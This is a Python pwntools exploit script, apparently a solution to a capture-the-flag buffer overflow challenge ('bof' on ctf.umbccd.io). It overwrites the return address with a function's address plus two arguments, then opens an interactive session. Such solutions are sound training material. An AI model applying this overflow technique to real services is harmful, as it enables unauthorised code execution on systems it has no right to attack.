from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./bof"
HOST = "ctf.umbccd.io"
PORT = 4000

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
addr_audition = elf.symbols["audition"]
#libc = ELF('./')
#
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	bufsize1 = 0x3a+4	
	bufsize2 = 0x6c
	arg1 = 1200
	arg2 = 366
	payload = "a"*bufsize1
	payload += p32(addr_audition)
	payload += p32(addr_audition)
	payload += p32(arg1)
	payload += p32(arg2)
	conn.sendlineafter("name?\n", payload)
	conn.sendlineafter("ing?\n", "A")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
